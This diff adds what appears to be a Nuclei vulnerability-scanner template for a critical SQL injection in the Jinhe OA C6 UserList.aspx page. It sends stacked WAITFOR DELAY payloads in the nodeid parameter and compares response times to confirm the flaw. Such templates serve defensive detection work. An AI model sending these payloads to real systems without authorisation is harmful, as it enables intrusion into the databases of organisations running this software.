@@ -1,0 +1,37 @@
+id: jinhec6-userlist-sqli
+
+info:
+  name: jinhec6-userlist-sqli
+  author: xiaokp7
+  severity: critical
+  description: 金和OA C6 UserList存在SQL注入漏洞
+
+http:
+  - raw:
+    - |
+      GET /c6/JHSoft.Web.Users/UserList.aspx/?nodeid=1007%27%3BWAITFOR+DELAY+%270%3A0%3A0%27-- HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:124.0) Gecko/20100101 Firefox/124.0
+      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+      Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+      Accept-Encoding: gzip, deflate
+      Connection: close
+      Cookie: ASP.NET_SessionId=em2cghjq3mhuu0f04g3fchhj
+      
+    - |
+      GET /c6/JHSoft.Web.Users/UserList.aspx/?nodeid=1007%27%3BWAITFOR+DELAY+%270%3A0%3A3%27-- HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:124.0) Gecko/20100101 Firefox/124.0
+      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+      Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+      Accept-Encoding: gzip, deflate
+      Connection: close
+      Cookie: ASP.NET_SessionId=em2cghjq3mhuu0f04g3fchhj
+      
+
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - 'duration_1>0 && duration_1<1'
+          - 'duration_2>3 && duration_2<4'
